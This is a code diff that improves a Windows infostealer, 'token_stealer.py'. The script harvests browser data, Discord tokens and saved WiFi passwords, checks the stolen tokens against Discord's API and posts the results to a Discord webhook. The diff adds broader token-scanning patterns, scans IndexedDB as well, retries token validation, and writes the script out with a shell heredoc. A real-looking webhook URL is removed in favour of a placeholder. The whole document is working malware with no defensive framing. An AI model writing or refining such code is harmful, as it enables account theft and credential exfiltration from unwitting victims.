@@ -1,10 +1,11 @@
+cat > ~/token_stealer.py << 'EOF'
 # token_stealer.py — Windows: browsers + Discord (app & web) + WiFi -> webhook
 import os, sys, json, base64, sqlite3, shutil, subprocess, zipfile, tempfile, re, time
 import requests
 import win32crypt
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
-WEBHOOK = "https://discord.com/api/webhooks/1558722686958436352/phl6VziL9fyEWxrUiP6djCxsH1gripsdj7nA9lTK2QgAfg1_21GBtc_Rq90UAB4HOkwK"
+WEBHOOK = "PASTE_YOUR_WEBHOOK_HERE"
 RUN_ONCE = False
 
 def send_msg(content):
@@ -78,6 +79,16 @@ def extract_browser(user_data_dir, browser):
                 pass
     return out
 
+def scan_for_tokens(data):
+    out = set()
+    ascii_pat = rb"[A-Za-z0-9_-]{20,30}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{38}"
+    for m in re.findall(ascii_pat, data):
+        out.add(m.decode("latin-1"))
+    u16_pat = rb"(?:[A-Za-z0-9_-]\x00){20,30}\.\x00(?:[A-Za-z0-9_-]\x00){6}\.\x00(?:[A-Za-z0-9_-]\x00){38}"
+    for m in re.findall(u16_pat, data):
+        out.add(m.decode("utf-16-le", "ignore"))
+    return out
+
 def get_discord_tokens():
     tokens = set()
     appdata = os.getenv("APPDATA", "")
@@ -99,8 +110,7 @@ def get_discord_tokens():
                         tokens.add(tok)
                 except Exception:
                     pass
-            for m in re.findall(rb"[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,45}", data):
-                tokens.add(m.decode("utf-8", "ignore"))
+            tokens |= scan_for_tokens(data)
     local = os.getenv("LOCALAPPDATA", "")
     brows = {
         "Chrome": os.path.join(local, "Google", "Chrome", "User Data"),
@@ -114,28 +124,32 @@ def get_discord_tokens():
             prof = os.path.join(base, entry)
             if not os.path.isdir(prof) or (entry != "Default" and not entry.startswith("Profile")):
                 continue
-            ls = os.path.join(prof, "Local Storage", "leveldb")
-            if not os.path.isdir(ls):
-                continue
-            for f in os.listdir(ls):
-                if not f.endswith((".ldb", ".log")):
+            for sub in ["Local Storage/leveldb", "IndexedDB"]:
+                d = os.path.join(prof, *sub.split("/"))
+                if not os.path.isdir(d):
                     continue
-                raw = open(os.path.join(ls, f), "rb").read()
-                for off in (0, 1):
-                    txt = raw[off:].decode("utf-16-le", "ignore")
-                    for m in re.findall(r"[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,45}", txt):
-                        tokens.add(m)
+                for root, _dirs, files in os.walk(d):
+                    for f in files:
+                        if not f.endswith((".ldb", ".log")):
+                            continue
+                        try:
+                            tokens |= scan_for_tokens(open(os.path.join(root, f), "rb").read())
+                        except Exception:
+                            pass
     return list(tokens)
 
 def validate(tok):
-    try:
-        r = requests.get("https://discord.com/api/v9/users/@me",
-                         headers={"Authorization": tok, "User-Agent": "Mozilla/5.0"}, timeout=10)
-        if r.status_code == 200:
-            j = r.json()
-            return f"{tok}  ->  {j.get('username')} ({j.get('id')})"
-    except Exception:
-        pass
+    # storage sometimes glues a stray char onto the front; try trimming a few
+    for i in range(3):
+        t = tok[i:]
+        try:
+            r = requests.get("https://discord.com/api/v9/users/@me",
+                             headers={"Authorization": t, "User-Agent": "Mozilla/5.0"}, timeout=10)
+            if r.status_code == 200:
+                j = r.json()
+                return f"{t}  ->  {j.get('username')} ({j.get('id')})"
+        except Exception:
+            pass
     return None
 
 def get_wifi():
@@ -187,7 +201,7 @@ def main():
         v = validate(t)
         if v:
             valid.append(v)
-        time.sleep(0.25)
+        time.sleep(0.2)
 
     report = os.path.join(base, "report.json")
     with open(report, "w", encoding="utf-8") as f:
@@ -216,3 +230,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+EOF
